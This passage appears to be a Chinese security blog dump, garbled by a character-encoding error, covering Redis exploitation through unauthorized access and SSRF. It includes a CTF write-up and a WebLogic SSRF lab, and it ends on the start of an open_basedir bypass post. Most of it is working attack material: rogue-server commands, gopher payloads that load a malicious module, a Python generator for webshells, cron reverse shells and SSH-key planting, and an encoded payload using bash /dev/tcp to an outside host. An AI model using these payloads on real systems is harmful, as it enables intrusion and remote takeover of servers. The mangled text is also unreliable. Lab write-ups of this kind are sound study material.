‡redisï¼Œå¦‚ä¸‹å›¾ï¼Œå­˜åœ¨æœªæˆæƒè®¿é—® ç›´æ¥ä¸Šexpï¼Œè¿™é‡Œä½¿ç”¨äº†ä¸¤ç§ï¼Œä½†æ„Ÿè§‰ç¬¬ä¸€ç§æ›´å¥½ä¸€ç‚¹ python3 redis-rogue-server.py --rhost 192.168.246.137 --rport 6379 --lhost 192.168.246.130 6666 å¯ä»¥çœ‹åˆ°ç›´æ¥å°±æ‹¿åˆ°shelläº† ç¬¬äºŒä¸ªï¼šhttps://github.com/vulhub/redis-rogue-getshell python3 redis-master.py -r 192.168.246.137 -p 6379 -L 192.168.246.130 -P 6666 -f RedisModulesSDK/exp.so -c \"id\" [ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe è¿™é‡Œæ¨èå»nssctfå¹³å°å¤ç°ï¼Œbuuä¼¼ä¹æœ‰é—®é¢˜ &lt;?php function check_inner_ip($url) { $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) { die('url fomat error'); } try { $url_parse=parse_url($url); } catch(Exception $e) { die('url fomat error'); return false; } $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; } function safe_request_url($url) { if (check_inner_ip($url)) { echo $url.' is inner ip'; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); } curl_close($ch); var_dump($output); } } if(isset($_GET['url'])){ $url = $_GET['url']; if(!empty($url)){ safe_request_url($url); } } else{ highlight_file(__FILE__); } // Please visit hint.php locally. ?&gt; è¿™é‡Œçš„é‡ç‚¹å°±æ˜¯é’ˆå¯¹urlçš„æ£€æŸ¥ï¼Œå…¶ä¸­çš„å¯¹äºç”¨åˆ°çš„åè®®ä»–è§„å®šåªèƒ½æ˜¯httpã€httpsã€gopherä¸dictï¼Œä½†æˆ‘ä»¬é‡ç‚¹éœ€è¦ç»•è¿‡çš„æ˜¯è¿™ä¸ªï¼š return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; } è¿™é‡Œæ˜¯å°†ä¸€ä¸ªæ ‡å‡†ipåœ°å€è½¬æ¢ä¸ºäºŒè¿›åˆ¶å½¢å¼çš„é•¿å­—ç¬¦ä¸²ï¼Œç„¶åä¸è¿™é‡Œè§„å®šçš„127.0.0.1ã€10.0.0.0ã€172.16.0.0ã€192.168.0.0è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰ä¸€ä¸ªä¸ºçœŸï¼Œåˆ™è¯æ˜æ ‡å¿—çš„ssrfçš„æ”»å‡» // åˆå§‹çš„8çš„äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œå³è¾¹æœ‰ä¸¤ä½ç©ºå‡ºï¼š 0000 0000 0000 0000 0000 0000 0000 1000 // æ‰§è¡Œå³ç§»ä¸¤ä½åï¼š 0000 0000 0000 0000 0000 0000 0000 0010 è¿™é‡Œç»•è¿‡ä¼¼ä¹ä¹ŸæŒºç®€å•çš„ï¼Œå°±æ˜¯0.0.0.0å³å¯ï¼Œç„¶åæ ¹æ®é¢˜ç›®æç¤ºè®©æˆ‘ä»¬æŸ¥çœ‹hint.php ?url=http://0.0.0.0/hint.php &lt;?php if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\"){ highlight_file(__FILE__); } if(isset($_POST['file'])){ file_put_contents($_POST['file'],\"&lt;?php echo 'redispass is root';exit();\".$_POST['file']); } éšåå°±æ˜¯é€šè¿‡file_put_contentså‡½æ•°å¤„ç†postä¼ å‚ï¼Œå¹¶ä¸”ä»£ç ä¸­æç¤ºæˆ‘ä»¬redisçš„å¯†ç æ˜¯rootï¼Œè¿™ä¹Ÿæç¤ºæˆ‘ä»¬è¿™é“é¢˜è€ƒå¯Ÿçš„å°±æ˜¯å¦‚ä½•é€šè¿‡ssrfæ”»å‡»redis è¿™é‡ŒéªŒè¯ä¹Ÿè¯´æ˜6379çš„å­˜åœ¨ï¼Œæ¥ä¸‹æ¥å…ˆå°è¯•å‘å…¶ä¸­åŠ è½½æ¶æ„.soï¼Œä¸è¿‡éœ€è¦æ³¨æ„å¯†ç çš„éªŒè¯ï¼Œpayloadå¦‚ä¸‹ï¼š auth root #ç”¨æˆ·è®¤è¯ config set dir /tmp/ #è®¾ç½®å¤‡ä»½ç›®å½• config set dbfilename exp.so #è®¾ç½®å¤‡ä»½æ–‡ä»¶å slaveof vpsip vpsport\t#è®¾ç½®ä¸»ä»å…³ç³»ï¼Œè¿™é‡Œçš„ä¸»redisè®¾ç½®ä¸ºæˆ‘ä»¬çš„æ¶æ„vps module load /tmp/exp.so\t#ä»æˆ‘ä»¬çš„æ¶æ„ä¸»redisä¸ŠåŠ è½½æ¶æ„exp.so system.rev vpsip vpsport\t#æ‰§è¡Œsystemå‘½ä»¤ï¼Œè¿›è¡Œåå¼¹shell ä½†è¿™é“é¢˜ç”¨åˆ°çš„æ˜¯ssrfï¼Œæ‰€ä»¥ä¸Šè„šæœ¬ from urllib.parse import quote import requests payload = \"\"\"auth root config set dir /tmp config set dbfilename exp.so slaveof vps port module load /tmp/exp.so system.rev vpsip vpsport \"\"\" inner_url = f\"gopher://0.0.0.0:6379/_{quote(quote(payload))}\" print(inner_url) #url = \"http://e90ce983-16dd-4dff-8850-58a09b264a47.node4.buuoj.cn:81/?url=\" + inner_url #resp = requests.get(url) #print(resp.text) å‘é€ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡å¥½æ¶æ„masterï¼Œä¸”å¿…é¡»æ˜¯å…¬ç½‘çš„vpsï¼Œè¿™é‡Œæ¨èé¡¹ç›®ï¼š https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py ä¸Šé¢è¿™ä¸ªç”¨äºéœ€è¦æˆæƒçš„redisæ”»å‡»ä½¿ç”¨ https://github.com/n0b0dyCN/redis-rogue-server --è¿™ä¸ªç”¨äºç›®æ ‡redisæ˜¯æœªæˆæƒçš„æ—¶å€™ä½¿ç”¨ è¿™é‡Œæˆ‘ä»¬è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œè¿™é‡Œéœ€è¦å°†æ¶æ„exp.soæ–‡ä»¶æ”¾å…¥redis-rogue-server.pyåŒç›®å½•ä¸‹ python3 redis_rogue_server.py -path exp.so -lhost vps -lport 5555 #æŒ‡å®šexp.soæ–‡ä»¶è·¯å¾„ -lhostä¸ºæˆ‘ä»¬çš„vpsip lportè®¾ç½®ä¸ºvpsè¦ç›‘å¬çš„ç«¯å£ è¿™é‡Œå®é™…ä¸Šæˆ‘ä»¬æ˜¯ç­‰å¾…è¢«åŠ¨è¿æ¥ï¼Œè¿™é‡Œå¼€å¯äº†ä¸Šè¿°æœåŠ¡åï¼Œæˆ‘ä»¬æ„é€ å‘½ä»¤å‘é€ from urllib.parse import quote import requests # auth root # config set dir /tmp # config set dbfilename exp.so # slaveof vps 5555 # module load /tmp/exp.so # system.rev vps 8888 payload = \"\"\"auth root module load /tmp/exp.so system.rev vps 8888 quit \"\"\" inner_url = f\"gopher://0.0.0.0:6379/_{quote(quote(payload))}\" print(inner_url) è¿™é‡Œæˆ‘æ˜¯åˆ†äº†ä¸¤æ‰¹payloadå‘é€ï¼Œä¸€èµ·å‘é€ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡å°±å¾—å‘é€ä¸¤æ¬¡äº†ï¼Œè¿™é‡Œå°†å¾—åˆ°çš„payloadå‘é€åˆ°ssrfæ¼æ´ç‚¹ï¼Œæ¥ç€å°±ä¼šå‘ç°æˆ‘ä»¬çš„æ¶æ„æœåŠ¡æ”¶åˆ°äº†è¿æ¥è¯·æ±‚ï¼Œä½†è¦æ³¨æ„åœ¨vpsä¸Šå¼€å¯æ¥å—åå¼¹shellçš„ç«¯å£ã€‚ æœ€åå°±ä¼šå‘ç°æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°shellï¼Œè¿™é‡Œä¸çŸ¥ä¸ºä½•æˆªå›¾éƒ½æ²¡äº†ï¼Œæ‡’å¾—åœ¨æäº†ã€‚ åæ§½ä¸€æ‰‹ï¼šbuué¢˜ç›®ç¯å¢ƒå®³äººå•Šï¼Œæˆ‘ä¸€ç›´ä¸æˆåŠŸï¼Œè¿˜ä»¥ä¸ºæ˜¯æˆ‘æ€è·¯æœ‰é—®é¢˜ï¼Œä¸€ç›´æƒ³ä¸å‡ºæ¥ã€‚ã€‚ã€‚ã€‚ Weblogic SSRFæ¼æ´ ç®€ä»‹ WebLogicæ˜¯ç¾å›½Oracleå…¬å¸å‡ºå“çš„ä¸€ä¸ªapplication serverç¡®åˆ‡çš„è¯´æ˜¯ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„ä¸­é—´ä»¶ï¼ŒBEA WebLogicæ˜¯ç”¨äºå¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†å¤§å‹åˆ†å¸ƒå¼Webåº”ç”¨ã€ç½‘ç»œåº”ç”¨å’Œæ•°æ®åº“åº”ç”¨çš„Javaåº”ç”¨æœåŠ¡å™¨ã€‚ Weblogicä¸­å­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å‘é€ä»»æ„HTTPè¯·æ±‚ï¼Œè¿›è€Œæ”»å‡»å†…ç½‘ä¸­redisã€fastcgiç­‰è„†å¼±ç»„ä»¶ã€‚ å½±å“èŒƒå›´ï¼š weblogic ç‰ˆæœ¬10.0.2 weblogic ç‰ˆæœ¬10.3.6 æ¼æ´å¤ç° å¤ç°ç¯å¢ƒï¼šhttps://vulhub.org/#/environments/weblogic/ssrf/ å¦‚ä¸Šå›¾ä»£è¡¨æˆåŠŸå¯åŠ¨ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥bpæŠ“ä¸ªåŒ…ï¼Œè¿™é‡Œæˆ‘å…ˆç”¨dirsearchæ‰«ä¸ªç›®å½• å¯ä»¥å‘ç°è¿˜æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œè¿™é‡Œæµ‹è¯•ä¸€ç•ªå‘ç°uddiè¿™ä¸ªç›®å½•å¾ˆå¯ç–‘ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œä¼¼ä¹æ˜¯ä¸ªæœªæˆæƒè®¿é—®ï¼Œç‚¹å‡»ç¬¬ä¸€ä¸ªè¿æ¥çš„searchæŠ“åŒ…å‘ç°ï¼Œå¦‚ä¸‹å›¾å­˜åœ¨ä¸€ä¸ªurlé“¾æ¥ è¿™é‡Œä¿®æ”¹ä¸ªå‚æ•°å€¼ä¸º127.0.0.1ï¼Œå¦‚ä¸‹å›¾å‘ç°å…¶å¥½åƒåœ¨å°è¯•è¿æ¥è¿™ä¸ªåœ°å€ï¼Œæˆ‘ä»¬æ¢æµ‹ä¸€ä¸‹ç«¯å£å­˜æ´»æƒ…å†µ bpçˆ†ç ´ç«¯å£ä¹‹åå‘ç°ä¸‹å›¾ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰æ¢æµ‹åˆ°ä»€ä¹ˆé‡ç‚¹ç«¯å£ï¼Œè¿™é‡Œæˆ‘å°±ä¸ä¼šäº†ï¼Œçœ‹äº†wpå‘ç°ï¼Œæ¯”æˆ‘æƒ³çš„æ›´å¤æ‚ï¼Œè¿™é‡Œéœ€è¦æ¢æµ‹å†…ç½‘ã€‚ã€‚è€Œæˆ‘åªæ˜¯å•çº¯æ¢æµ‹ä¸ªç«¯å£è€Œå·² è¿™é‡Œé¡ºä¾¿è¡¥å……ä¸€ä¸ªèµ„æ–™ï¼š2016ä¹Œäº‘å¤§ä¼šä¸ŠçŒªçŒªä¾ å¸ˆå‚…ä»‹ç»çš„ã€ŠWebLogic SSRF æœåŠ¡æ¢æµ‹ã€‹ æ¥ä¸‹æ¥å°±è¿›è¡Œå†…ç½‘ipçš„æ¢æµ‹ï¼Œä¸è¿‡è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ˜¯ç”¨dockeræ­å»ºçš„ï¼Œå› æ­¤æ¢æµ‹çš„æ—¶å€™åº”è¯¥ä½¿ç”¨dockerçš„ipæ®µæ¥æ¢æµ‹ æˆ‘ä»¬å¼€å§‹è®¾ç½®çˆ†ç ´æ ¼å¼ï¼Œè‡ªå®šä¹‰è¿­ä»£å™¨çš„payloadç±»å‹ è¿™é‡Œåœ¨1ä¸­è¾“å…¥172ï¼Œç„¶åä¸‹æ–¹æ·»åŠ .åˆ†éš”ç¬¦ ä½ç½®2å¡«å…¥17ä¸åˆ†éš”ç¬¦. è¿™é‡Œæé”™äº†ï¼Œå¯¹æˆ‘çš„é¶æœºæ¥è¯´æ˜¯è¯¥å¡«å…¥19çš„ ä½ç½®ä¸‰è®¾ç½®0-255ä¸åˆ†éš”ç¬¦. ç„¶åä½ç½®4è®¾ç½®0-255ï¼Œä½†ä¸éœ€è¦è®¾ç½®åˆ†éš”ç¬¦ å¼€å§‹çˆ†ç ´ï¼Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œçš„çˆ†ç ´å°±è¯´æ˜æˆ‘ä»¬çš„ipæ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯å¯¹åº”çš„ç«¯å£ä¸å­˜åœ¨ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æ¢æµ‹è¯¥ipçš„ç«¯å£å­˜æ´»æƒ…å†µå³å¯ è®¾ç½®å¥½å¼€å§‹çˆ†ç ´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œçš„æŠ¥é”™è¯´æ˜æˆ‘ä»¬çš„ç«¯å£æ˜¯å­˜æ´»çš„ Weblogicçš„SSRFæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç‰¹ç‚¹ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥%0a%0dæ¥æ³¨å…¥æ¢è¡Œç¬¦ï¼Œè€ŒæŸäº›æœåŠ¡ï¼ˆå¦‚redisï¼‰æ˜¯é€šè¿‡æ¢è¡Œç¬¦æ¥åˆ†éš”æ¯æ¡å‘½ä»¤ï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥SSRFæ”»å‡»å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ã€‚ é‚£æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•å†™å…¥å®šæ—¶ä»»åŠ¡åå¼¹shell #!/usr/local/bin python # coding=utf8 try: from urllib import quote except: from urllib.parse import quote def generate_info(passwd): cmd = [ \"info\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_shell(filename, path, passwd, payload): cmd = [\"flushall\", \"set 1 {}\".format(payload), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_reverse(filename, path, passwd, payload): # centos cmd = [\"flushall\", \"set 1 {}\".format(payload), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_sshkey(filename, path, passwd, payload): cmd = [\"flushall\", \"set 1 {}\".format(payload), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_rce(lhost, lport, passwd, command=\"cat /etc/passwd\"): exp_filename = \"exp.so\" cmd = [ \"SLAVEOF {} {}\".format(lhost, lport), \"CONFIG SET dir /tmp/\", \"config set dbfilename {}\".format(exp_filename), \"MODULE LOAD /tmp/{}\".format(exp_filename), \"system.exec {}\".format(command.replace(\" \", \"${IFS}\")), # \"SLAVEOF NO ONE\", # \"CONFIG SET dbfilename dump.rdb\", # \"system.exec rm${IFS}/tmp/{}\".format(exp_filename), # \"MODULE UNLOAD system\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def rce_cleanup(): exp_filename = \"exp.so\" cmd = [ \"SLAVEOF NO ONE\", \"CONFIG SET dbfilename dump.rdb\", \"system.exec rm /tmp/{}\".format(exp_filename).replace(\" \", \"${IFS}\"), \"MODULE UNLOAD system\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def redis_format(arr): CRLF = \"\\r \" redis_arr = arr.split(\" \") cmd = \"\" cmd += \"*\" + str(len(redis_arr)) for x in redis_arr: cmd += CRLF + \"$\" + str(len((x))) + CRLF + x cmd += CRLF return cmd def generate_payload(passwd, mode): payload = \"test\" if mode == 0: filename = \"shell.php\" path = \"/var/www/html\" shell = \" &lt;?=eval($_GET[0]);?&gt; \" cmd = generate_shell(filename, path, passwd, shell) elif mode == 1: filename = \"root\" path = \"/var/spool/cron/\" shell = \" */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1 \" cmd = generate_reverse(filename, path, passwd, shell.replace(\" \", \"^\")) elif mode == 2: filename = \"authorized_keys\" path = \"/root/.ssh/\" pubkey = \" ssh-rsa \" cmd = generate_sshkey(filename, path, passwd, pubkey.replace(\" \", \"^\")) elif mode == 3: lhost = \"124.220.233.26\" lport = \"5555\" command = \"ls /\" cmd = generate_rce(lhost, lport, passwd, command) elif mode == 31: cmd = rce_cleanup() elif mode == 4: cmd = generate_info(passwd) protocol = \"gopher://\" ip = \"0.0.0.0\" port = \"6379\" payload = protocol + ip + \":\" + port + \"/_\" for x in cmd: payload += quote(quote(redis_format(x).replace(\"^\", \" \"))) return payload if __name__ == \"__main__\": # 0 for webshell ; 1 for re shell ; 2 for ssh key ; # 3 for redis rce ; 31 for rce clean up # 4 for info # suggest cleaning up when mode 3 used mode = 1 # input auth passwd or leave blank for no pw passwd = '' p = generate_payload(passwd, mode) print(p) é€‰æ‹©æ¨¡å¼1ï¼Œè¿™é‡Œåªéœ€è¦ä¸€æ¬¡ç¼–ç å³å¯ aaa%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2461%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/5555%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0Aaaa å¦‚ä¸Šå›¾æˆåŠŸåå¼¹shellï¼Œè¿™é‡Œæœ‰ç‚¹æ‡µé€¼çš„æ˜¯ï¼Œæˆ‘çœ‹é‚£äº›å¸ˆå‚…éƒ½åœ¨payloadå‰ååŠ ä¸ªaaaçš„æ— ç”¨å­—ç¬¦ï¼Œä¸çŸ¥é“ä¸ºä½•ï¼Œæˆ‘è¿™é‡Œåˆ é™¤ä¹‹åæµ‹è¯•ï¼Œä¾æ—§å¯ä»¥åå¼¹shellã€‚ã€‚ã€‚æœäº†å¤šä¸ªæ–‡ç« ä¹Ÿæ— æœï¼Œå¸Œæœ›æ—¥åå¯ä»¥è§£æƒ‘å§ docker exec -it 4cfd33d77a1c ip addr è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šè¿°å‘½ä»¤æ¥å¾—çŸ¥dockerå®¹å™¨çš„ipåœ°å€ã€‚ 0x07 ä¿®å¤å»ºè®® â‘  Redisè®¾ç½®è®¿é—®ç™½åå•(å…¥ é˜²æ­¢æ¶æ„è®¿é—®å’Œå‡º é˜²æ­¢æ¶æ„è®¾ç½®ä¸ºä¸»ä») â‘¡ Redisæ·»åŠ è®¤è¯ åœ¨é…ç½®æ–‡ä»¶/etc/redis/redis.confä¸­ä¿®æ”¹requirepassså±æ€§ä¸ºå¼ºå£ä»¤ï¼Œå®Œæˆåé‡å¯æœåŠ¡å™¨ åŠ¨æ€å‘½ä»¤è®¾ç½®config set requirepass YorPass â‘¢ é‡å‘½åç›¸å…³å‘½ä»¤ åœ¨é…ç½®æ–‡ä»¶/etc/redis/redis.confä¸­ rename-command CONFIG PDZA1DAä¹Ÿå¯ä»¥rename-command CONFIG \"\" è®¾ç½®ä¸ºç©ºæ¥ç¦ç”¨ å¯¹äºæ¶æ„ç‰¹å¾ï¼Œå¯ä»¥é€šè¿‡MODULE LISTå‘½ä»¤æŸ¥çœ‹å½“å‰åŠ è½½çš„æ¨¡å—ä¿¡æ¯ï¼Œé‡ç‚¹å…³æ³¨éå®˜æ–¹åŠ è½½æˆ–è€…SYSTEMã€EXECç­‰æ¶æ„å…³é”®è¯ï¼Œç›‘æ§RedisæœåŠ¡å™¨ä¸ŠRedisè¿›ç¨‹å†™å…¥çš„soæ–‡ä»¶ï¼ˆWindowsä¸ºDLLæ–‡ä»¶ï¼‰ï¼Œæµé‡ä¸­å¯ä»¥é‡ç‚¹å…³æ³¨FULLRESYNCå‘½ä»¤ä»¥åŠç›¸å…³æ–‡ä»¶äºŒè¿›åˆ¶ç‰¹å¾ï¼ˆWebshellï¼ŒCronï¼ŒAuthorized_keysï¼Œsoå’ŒDLLç­‰ï¼‰ã€‚ 0x08 çŸ¥è¯†æ€»ç»“ Dictåè®®ä½¿ç”¨æ³¨æ„äº‹é¡¹ Dictåè®®ä¸­å¯ä»¥ç”¨:ä»£æ›¿ç©ºæ ¼ ?ä¼šæˆªæ–­åé¢çš„å†…å®¹(å†™é©¬çš„æƒ…å†µä¸‹è¦æƒ³åŠæ³•bypass â€œ?â€) dictåè®®ä¸€æ¬¡åªèƒ½å‘é€ä¸€æ¡æ•°æ® crontabå†™å…¥Tips /etc/crontab /etc/cron.d/*ï¼šå°†ä»»æ„æ–‡ä»¶å†™åˆ°è¯¥ç›®å½•ä¸‹ï¼Œæ•ˆæœå’Œcrontabç›¸åŒï¼Œæ ¼å¼ä¹Ÿè¦ä¸€è‡´ï¼Œå¹¶ä¸”åœ¨è¯¥ç›®å½•æ“ä½œå¯ä»¥åšåˆ°ä¸è¦†ç›–ä»»ä½•å…¶ä»–æ–‡ä»¶çš„æƒ…å†µè¿›è¡Œå¼¹shellï¼› /var/spool/cron/rootï¼šCentOSç³»ç»Ÿä¸‹rootç”¨æˆ·çš„cronæ–‡ä»¶ï¼› /var/spool/cron/crontabs/rootï¼šDebianç³»ç»Ÿä¸‹rootç”¨æˆ·çš„cronæ–‡ä»¶ï¼› 0x09 å‚è€ƒæ–‡ç«  redis ä¸»ä»å¤åˆ¶ RCE æµ…æRedisä¸­SSRFçš„åˆ©ç”¨ Redisä¸»ä»å¤åˆ¶RCEå½±å“åˆ†æ æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰ä¹‹Redisç¯‡ SSRF+Redis åˆ©ç”¨SSRFæ”»å‡»å†…ç½‘RedisæœåŠ¡ æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰ä¹‹Redisç¯‡ Redisä¸»ä»å¤åˆ¶RCEåˆ†æ å¾ˆç»å…¸çš„ä¸€é“CTF-WriteUP[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe åˆ©ç”¨WebLogic SSRFæ¼æ´æ”»å‡»å†…ç½‘Redisåå¼¹shell SSRFä¸­Redisçš„åˆ©ç”¨ WebLogic SSRFï¼ˆCVE-2014-4210ï¼‰ SSRFâ€”â€”weblogic vulhub æ¼æ´å¤ç°åŠæ”»å‡»å†…ç½‘redisï¼ˆä¸€ï¼‰ï¼ˆé™„æ‰¹é‡æ£€æµ‹è„šæœ¬ï¼‰","tags":["åŸºç¡€çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"open_basedir+wake_upç»•è¿‡æ€»ç»“","path":"/2023/12/25/open-basedir-wakeup-rao-guo/","content":"0x01 open_basedirç»•è¿‡ é…ç½®ä»‹ç» open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚åœ¨php.iniä¸­è®¾ç½®open_basedirçš„å€¼/var/www/html è®¾ç½®open_basedir=/var/www/html/,é€šè¿‡webè®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/è¿™ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚ å‡è®¾è¿™æ—¶è¿æ¥ä¸€ä¸ªwebshellï¼Œå½“webshellå·¥å…·å°è¯•éå†å’Œè¯»å–å…¶ä»–ç›®å½•æ—¶å°†ä¼šå¤±è´¥ã€‚ä¹Ÿå°±æ˜¯èšå‰‘æ— æ³•æˆåŠŸè¯»å†™å…¶ä»–ç›®å½•ä¸‹çš„æ–‡ä»¶ ç³»ç»Ÿå‘½ä»¤å‡½æ•°ç»•è¿‡ å¦‚æœæ­¤æ—¶çš„é¶æœºåªæœ‰open_basedirçš„é™åˆ¶ï¼Œdisable_functionså¹¶æœªè¿‡å¤šé™åˆ¶ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡systemå°è¯•ï¼Œåœ¨è¿™é‡Œå°±å€Ÿç”¨å¸ˆå‚…ä»¬çš„å›¾ç‰‡äº†~~~ èƒ½å¤Ÿéå†ä¸Šä¸Šçº§ç›®å½•,è€Œåœ¨webshellå·¥å…·ä¸­æ—¶è¢«ç¦æ­¢çš„,è¯´æ˜ç¡®å®èƒ½å¤Ÿç»•è¿‡ï¼Œå®é™…æƒ…å†µä¸­,å¯èƒ½system()å‡½æ•°ç”±äºdisable_functionç¦ç”¨æ— æ³•ä½¿ç”¨ï¼Œå¯é€šè¿‡åŒç±»æ‰§è¡Œå‘½ä»¤å‡½æ•°ç»•è¿‡ã€‚ä½†å¦‚æœå‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰çš„å‘½ä»¤å‡½æ•°ï¼Œé‚£å°±éœ€è¦ä»¥ä¸‹å‡ ç§æ–¹æ³•äº†ã€‚ åˆ©ç”¨glob://åè®®ç»•è¿‡ glob://ä¼ªåè®® glob://æ˜¯æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼,globæ•°æ®æµåŒ…è£…å™¨è‡ª PHP 5.3.0 èµ·å¼€å§‹æœ‰æ•ˆï¼Œä¸‹é¢æ˜¯å®˜æ–¹çš„ä¸€ä¸ªdomo &lt;?php // å¾ªç¯ ext/spl/examples/ ç›®å½•é‡Œæ‰€æœ‰ *.php æ–‡ä»¶ // å¹¶æ‰“å°æ–‡ä»¶åå’Œæ–‡ä»¶å°ºå¯¸ $it = new DirectoryIterator(\"glob://ext/spl/examples/*.php\"); foreach($it as $f) { printf(\"%s: %.1FK \", $f-&gt;getFilename(), $f-&gt;getSize()/1024); } ?&gt; ä½†æ˜¯å•ç‹¬çš„globæ˜¯æ— æ³•ç»•è¿‡çš„ï¼Œå±€é™æ€§åœ¨äºå®ƒåªèƒ½åˆ—å‡ºæ ¹ç›®å½•ä¸open_basediræ‰§è¡Œç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå…¶ä»–çš„å°±ä¸è¡Œäº†ï¼Œè€Œä¸”ä¹Ÿä¸èƒ½è¯»å–æ–‡ä»¶å†…å®¹ã€‚ æ¥ä¸‹æ¥å°±æ˜¯pç¥æ€»ç»“çš„æ–¹æ³•äº†ï¼Œæˆ‘ç›´æ¥æ¬è¿‡æ¥ä¸Šç¯‡æ–‡ç« å†™çš„äº†ï¼Œä½†é™¤äº†é‚£äº›è¿˜æœ‰å¾ˆå¤šã€‚ DirectoryIterator + Glob åˆ—ä¸¾ç›®å½• DirectoryIteratoræ˜¯PHP 5ä¹‹åæ·»åŠ çš„ä¸€ä¸ªç±»ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç®€å•çš„æŸ¥çœ‹ç›®å½•çš„æ¥å£ã€‚è€Œglobï¼šæ•°æ®æµåŒ…è£…å™¨æ˜¯ä»PHP 5.3.0å¼€å§‹æœ‰æ•ˆçš„ï¼Œç”¨æ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„ã€‚ ä¸Špayloadï¼š &lt;?php // 